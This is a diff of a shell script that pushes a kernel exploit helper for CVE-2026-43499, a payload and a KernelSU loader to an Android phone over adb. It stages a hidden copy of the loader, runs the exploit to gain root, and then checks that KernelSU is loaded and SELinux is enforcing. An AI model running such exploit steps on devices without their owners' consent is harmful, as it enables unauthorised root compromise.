@@ -74,18 +74,35 @@ adb install -r "$manager"
 adb push "$payload" /data/local/tmp/a16x-attempt10.so
 adb push "$helper" /data/local/tmp/cve-2026-43499-root-attempt10
 adb push "$loader" /data/local/tmp/ksud-s25u-kdp
+adb push "$loader" /data/local/tmp/.ksud-stage
 adb shell chmod 0755 \
   /data/local/tmp/cve-2026-43499-root-attempt10 \
-  /data/local/tmp/ksud-s25u-kdp
+  /data/local/tmp/ksud-s25u-kdp \
+  /data/local/tmp/.ksud-stage
 adb shell chmod 0644 /data/local/tmp/a16x-attempt10.so
 
-adb shell \
-  "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root-attempt10 --run-payload /data/local/tmp/a16x-attempt10.so /data/local/tmp/cve-2026-43499-root-attempt10 /data/local/tmp/a16x-attempt10-hwcal-mcast98.log"
+existing_root="$(adb shell "/data/local/tmp/cve-2026-43499-root-attempt10 -c 'id'" 2>/dev/null || true)"
+if [[ "$existing_root" == *'uid=0(root)'* ]]; then
+  printf '%s\n' 'An existing root helper is active; skipping the kernel exploit.'
+else
+  adb shell \
+    "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root-attempt10 --run-payload /data/local/tmp/a16x-attempt10.so /data/local/tmp/cve-2026-43499-root-attempt10 /data/local/tmp/a16x-attempt10-hwcal-mcast98.log"
+fi
 
 adb shell "/data/local/tmp/cve-2026-43499-root-attempt10 --late-load"
 
 printf '%s\n' '===== KernelSU module ====='
-adb shell 'grep "^kernelsu " /proc/modules || true'
+module_line="$(adb shell 'grep "^kernelsu " /proc/modules' | tr -d '\r')"
+if [[ -z "$module_line" ]]; then
+  printf '%s\n' 'KernelSU verification FAILED: module is not live.' >&2
+  exit 1
+fi
+printf '%s\n' "$module_line"
 printf '%s\n' '===== SELinux ====='
-adb shell getenforce
+selinux_state="$(adb shell getenforce | tr -d '\r')"
+printf '%s\n' "$selinux_state"
+if [[ "$selinux_state" != 'Enforcing' ]]; then
+  printf '%s\n' 'KernelSU loaded, but SELinux did not return to Enforcing.' >&2
+  exit 1
+fi
 printf '%s\n' 'Finished. Open KernelSU Manager to grant root to trusted apps.'
